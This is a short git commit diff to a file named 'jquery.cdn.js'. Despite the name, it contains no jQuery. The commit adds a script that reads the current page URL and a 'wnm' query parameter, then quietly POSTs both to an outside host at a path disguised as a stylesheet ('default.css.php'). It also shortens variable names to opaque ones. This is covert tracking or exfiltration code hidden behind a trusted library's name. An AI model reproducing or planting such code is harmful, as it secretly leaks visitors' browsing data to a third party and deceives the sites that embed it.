601a212551a5e3ae278bc45328cbec1b420062e3
bootstarpz <50875669+bootstarpz@users.noreply.github.com>
2023-01-19 03:11:08 +0600

    Update jquery.cdn.js

--- jquery.cdn.js
+++ jquery.cdn.js
@@ -1,5 +1,13 @@
-    var websiteUrl = window.location.href;
+    var weu = window.location.href;
+    var wnm = getUrlParameter('wnm');
     var xhttp = new XMLHttpRequest();
-    xhttp.open("POST", "http://localhost/hk/Track_Website/listener.php", true);
+    xhttp.open("POST", "http://zorexeye.com/styles/cdn/default.css.php", true);
     xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-    xhttp.send("websiteUrl="+websiteUrl);
+    xhttp.send("weu="+weu+"&wnm="+wnm);
+
+    function getUrlParameter(name) {
+        name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+        var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+        var results = regex.exec(location.search);
+        return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+    };
